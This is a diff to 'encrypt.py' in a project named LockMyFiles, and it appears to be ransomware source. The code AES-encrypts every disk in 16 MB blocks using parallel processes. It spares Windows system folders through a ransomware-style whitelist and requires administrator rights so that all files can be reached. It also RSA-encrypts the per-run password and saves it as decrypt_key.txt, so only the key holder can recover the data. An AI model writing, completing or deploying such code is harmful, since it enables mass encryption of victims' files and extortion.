@@ -1,3 +1,12 @@
+'''
+@Author: 3vil_k4li & Odelesse-Chen
+@Date: 2019-12-25 14:39:38
+@LastEditTime : 2019-12-25 15:17:01
+@LastEditors  : Please set LastEditors
+@Description: AES-encrypt files
+@FilePath: \LockMyFiles\encrypt.py
+'''
+
 from __future__ import print_function
 import base64
 import os
@@ -5,10 +14,9 @@ import sys
 import string
 import ctypes
 import multiprocessing
-from time import perf_counter
+from time import perf_counter, sleep
 from string import ascii_letters, digits, punctuation
 from random import choices
-
 from aes_class import LockPath
 from rsa_class import RSA_Class
 
@@ -44,17 +52,28 @@ def encrypt_sys():
     except FileNotFoundError as e:
         print(e)
         print("press any key to quit")
-        
+        sleep(5)
         sys.exit(0)
 
     WHITE_DIRS = ['RECOVERY', 'DOCUMENTS AND SETTINGS', 'TESTLOCKSYSTEM', 'PROGRAMDATA', 'PROGRAM FILES (X86)', 'WINDOWS', 'PROGRAM FILES', '$WINDOWS.~WS', 'INTEL', 'MOZILLA', 'APPLICATION DATA', 'PERFLOGS', 'TOR BROWSER', '$WINDOWS.~BT', 'GOOGLE', '$RECYCLE.BIN', 'APPDATA', 'MSOCACHE', 'BOOT', 'WINDOWS.OLD', 'SYSTEM VOLUME INFORMATION']
     WHITE_FILES =  ['NTLDR', 'NTUSER.DAT', 'NTUSER.DAT.LOG', 'AUTORUN.INF', 'THUMBS.DB', 'BOOTSECT.BAK', 'BOOTFONT.BIN', 'NTUSER.INI', 'DESKTOP.INI', 'BOOT.INI', 'ICONCACHE.DB'] 
-    
-    encrypt_size = 16 * 1024 * 1024
+    # add the exe folder to WHITE_DIRS
+    WHITE_DIRS.append(os.path.abspath(os.path.dirname(__file__)).split('\\')[-1].upper())
+
+    encrypt_size = 16 * 1024 * 1024  # every block size is 16 MB
     decrypt_size = encrypt_size + 32
     keylen = 32
     ivlen = 16
     password = get_password()
+    
+    # save the RSA decrypt key 
+    password_json = password
+    password_json = password_json.encode()
+    password_json = RSA_Class.encryption(public_key, password_json)
+    password_json = base64.b64encode(password_json)
+    password_json = password_json.decode()
+    RSA_Class.save("./decrypt_key.txt", password_json)
+
     disk_list = get_disklist()
     print(disk_list)
 
@@ -62,12 +81,6 @@ def encrypt_sys():
     encrypt_size, decrypt_size, password, keylen, ivlen)
     L.multiprocessing_lock_path()
 
-    # public_key = RSA_Class.load_pub("./rsapub.pem")  
-    password = password.encode()
-    password = RSA_Class.encryption(public_key, password)
-    password = base64.b64encode(password)
-    password = password.decode()
-    RSA_Class.save("./password.json", password)
 
 def is_admin():
     try:
@@ -75,6 +88,7 @@ def is_admin():
     except:
         return False
 
+# check if running as administrator, we need to run as administrator, cause if we don't, some file couldn't be encrypted!
 @timeit
 def main():
     if is_admin():
